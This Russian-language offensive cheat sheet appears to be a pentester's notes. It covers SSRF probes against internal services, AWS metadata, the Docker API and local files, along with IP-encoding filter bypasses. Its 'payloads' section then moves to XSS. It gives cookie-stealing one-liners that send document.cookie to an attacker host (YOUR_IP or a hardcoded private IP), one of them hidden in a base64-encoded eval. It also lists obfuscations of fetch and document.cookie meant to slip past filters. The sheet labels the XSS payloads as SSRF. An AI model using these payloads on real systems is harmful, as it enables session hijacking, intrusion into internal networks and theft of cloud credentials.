# SSRF (Server-Side Request Forgery) — уязвимость при которой запросы делает сервер целевой машины. Атакующий заставляет сервер сходить по нужному адресу, как внутреннему так и внешнему и получить данные или вызвать действие от имени сервера.

# Что можно сделать ?
Получить доступ к внутренним API, читать файлы на сервере, сканировать порты


### 🎯 ЧТО ЭТО?
Сервер делает запросы от имени атакующего (внутренние или внешние).

### 🔥 ЧТО МОЖНО?
- Читать файлы: `file:///etc/passwd`
- Сканировать порты: `http://localhost:22`, `http://192.168.1.1:8080`
- Дергать API: метаданные AWS (`169.254.169.254/latest/meta-data/`), Docker (`127.0.0.1:2375/containers/json`), Kubernetes
- Вызвать действия от имени сервера

### 💥 ПРИМЕРЫ ЗАПРОСОВ
category=http://ТВОЙ_IP:8000/test                 # подтверждение
category=http://localhost/admin                   # локальный админ
category=http://192.168.2.10/config.php           # внутренний файл
category=file:///etc/passwd                        # чтение файла
category=php://filter/convert.base64-encode/resource=index.php
category=http://169.254.169.254/latest/meta-data/ # AWS metadata
category=http://127.0.0.1:2375/containers/json    # Docker API

### ОБХОД ФИЛЬТРОВ
127.0.0.1 → 2130706433, 0x7f000001, 017700000001, localhost, 0.0.0.0

### 📌 ГДЕ ВОЗНИКАЕТ?
Невалидируемые GET/POST параметры: ?url=, ?path=, ?dest=, ?redirect=, ?file=, ?domain=, ?src=, ?image_url=

Загрузка изображений по URL (аватары, превью)

Webhook-и, парсинг внешних страниц

Импорт/экспорт данных из/в облако

Проверка доступности хостов (ping/port scan)**
GET /check?host=127.0.0.1:22
GET /ping?ip=192.168.1.1
POST /scan
data: port=3306&host=localhost

Функции "поделиться", "предпросмотр ссылок"
GET /share?url=http://localhost/admin
GET /preview?link=file:///etc/passwd
POST /og-image
data: target=http://169.254.169.254/latest/meta-data/

---


## 💥 ПЕЙЛОАДЫ

### 🧪 ДРУГИЕ ТЕГИ ДЛЯ ОБХОДА (если `script` не работает)

```html
<iframe src="http://YOUR_IP:8888/exploit"></iframe>
```
```html
<object data="http://YOUR_IP:8888/exploit"></object>
```
```html
<link rel="import" href="http://YOUR_IP:8888/exploit">
```
```html
<embed src="http://YOUR_IP:8888/exploit">
```
<body onload="eval(atob('ZmV0Y2goIi8vMTkyLjE2OC4xODcuMTM5Ojg4ODg/Yz0iK2RvY3VtZW50LmNvb2tpZSk='))"/>

### 🎨 ЧЕРЕЗ CSS (если можно загрузить свою тему)
```css
body { background: url('http://YOUR_IP:8888/ssrf-test'); }
```

### 🔁 ЧЕРЕЗ META-ТЕГ (редко, но работает)
```html
<meta http-equiv="refresh" content="0; url=http://YOUR_IP:8888/ssrf-test">
```

### 🧠 ЧЕРЕЗ ONERROR (когда есть тег img)
```html
<img src=x onerror="fetch('http://YOUR_IP:8888/steal?c='+document.cookie)">
<img src=x onerror="new Image().src='http://192.168.187.139:8888/?c='+document.cookie">

```

### 📦 ЧЕРЕЗ FETCH ВНУТРИ SCRIPT (если инлайн-скрипты не режут)
```html
<script>fetch('http://YOUR_IP:8888/steal?c='+document.cookie)</script>
```

### 🧨 УНИВЕРСАЛЬНЫЙ ТЕСТ — ЗАГРУЗКА ВНЕШНЕГО РЕСУРСА
Любым способом заставь браузер жертвы сходить на твой IP:
```html
<script src="http://YOUR_IP:8888/test.js"></script>
Файл `test.js` на твоём сервере:
fetch('http://YOUR_IP:4444/steal?c='+document.cookie);
или test.html
<script>
fetch("http://192.168.187.139:8885/steal?c=" + document.cookie, {mode: 'no-cors'});
</script>

<img src="http://YOUR_IP:8888/test.jpg">
<link rel="stylesheet" href="http://YOUR_IP:8888/test.css">
```

Если хоть один запрос пришёл на твой сервер — значит, можно выполнить код.

---

### ОБФУСКАЦИЯ FETCH
window['fet' + 'ch']
window[['f','e','t','c','h'].join('')]
window[atob('ZmV0Y2g=')]
window[`${'fet'}${'ch'}`]

# ОБФУСКАЦИЯ DOCUMENT.COOKIE

document['coo' + 'kie']
document[['c','o','o','k','i','e'].join('')]
document[atob('Y29va2ll')]
document[`${'coo'}${'kie'}`]

### 🧠 ПОЧЕМУ ЭТО ВАЖНО
Иногда фильтр режет `fetch`, `XMLHttpRequest`, `onerror`, но пропускает `src`, `href` или `data`. В таких случаях внешний скрипт — единственный способ заставить браузер выполнить твой код.